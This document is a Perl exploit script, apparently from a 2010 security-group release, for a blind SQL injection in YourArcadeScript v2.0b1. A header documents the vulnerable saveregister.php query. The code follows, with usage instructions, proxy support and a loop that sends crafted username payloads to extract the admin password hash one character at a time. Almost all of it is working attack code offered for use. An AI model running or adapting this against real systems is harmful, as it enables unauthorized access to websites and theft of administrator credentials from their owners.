#!/usr/bin/perl
use LWP::UserAgent;
use HTTP::Request::Common qw(POST);
use Getopt::Long;
 
#                           \#'#/
#                           (-.-)
#    ------------------oOO---(_)---OOo-----------------
#    |          __             __                     |
#    |    _____/ /_____ ______/ /_  __  ______ ______ |
#    |   / ___/ __/ __ `/ ___/ __ \/ / / / __ `/ ___/ |
#    |  (__  ) /_/ /_/ / /  / /_/ / /_/ / /_/ (__  )  |
#    | /____/\__/\__,_/_/  /_.___/\__,_/\__, /____/   |
#    | Security Research Division      /____/ 2o1o    |
#    --------------------------------------------------
#    |  YourArcadeScript v2.0b1 Blind SQL Injection   |
#    --------------------------------------------------
# [!] Discovered by.: DNX
# [!] Homepage......: http://starbugs.host.sk
# [!] Vendor........: http://www.yourarcadescript.com
# [!] Detected......: 21.05.2010
# [!] Reported......: 22.05.2010
# [!] Response......: xx.xx.2010
#
# [!] Background....: Our script has features that other scripts have but ours is
#                     FREE! YourArcadeScript is a free arcade script, but can be
#                     used for pictures, youtube, or other media files.
#
# [!] Requirements..: magic_quotes_gpc = Off
#
# [!] Bug...........: $_POST["username"] in includes/saveregister.php near line 3
#
#                     03: $username=$_POST["username"];
#
#                     11: $res=mysql_query("select * from user where username like '$username'") or die(mysql_error());
#
 
if(!$ARGV[1])
{
  print "\n                            \\#'#/                        ";
  print "\n                            (-.-)                         ";
  print "\n   --------------------oOO---(_)---OOo--------------------";
  print "\n   | YourArcadeScript v2.0b1 Blind SQL Injection Exploit |";
  print "\n   |                    coded by DNX                     |";
  print "\n   -------------------------------------------------------";
  print "\n[!] Usage: perl yas.pl [Host] [Path] <Options>";
  print "\n[!] Example: perl yas.pl 127.0.0.1 /yas/";
  print "\n[!] Options:";
  print "\n       -p [ip:port]    Proxy support";
  print "\n";
  exit;
}
 
my %options = ();
GetOptions(\%options, "p=s");
my $ua      = LWP::UserAgent->new();
my $host    = $ARGV[0];
my $path    = $ARGV[1];
my $target  = "http://".$host.$path;
 
if($options{"p"})
{
  $ua->proxy('http', "http://".$options{"p"});
}
 
print "[!] Exploiting...\n";
 
go();
 
print "\n[!] Exploit done\n";
 
sub go
{
  syswrite(STDOUT, "[!] Get Admin Password: ", 24);
  for(my $i = 1; $i <= 32; $i++)
  {
    my $found = 0;
    my $h = 48  ;
    while(!$found && $h <= 102)
    {
      if(exploit($i, $h))
      {
        $found = 1;
        syswrite(STDOUT, chr($h), 1);
      }
      $h++;
      if($h == 58)
      {
        $h = 97;
      }
    }
  } 
}
 
sub exploit
{
  my $i   = shift;
  my $h   = shift;
  my $url = $target."includes/saveregister.php";
  my $inj = "_#1337#_' or substring((select password FROM settings limit 1),".$i.",1)=CHAR(".$h.")/*";
  my $req = POST $url, [username => $inj];
  my $res = $ua->request($req);
   
  if($res->content =~ /Sorry username exists register again/s)
  {
    return 1;
  }
  else
  {
    return 0;
  }
}
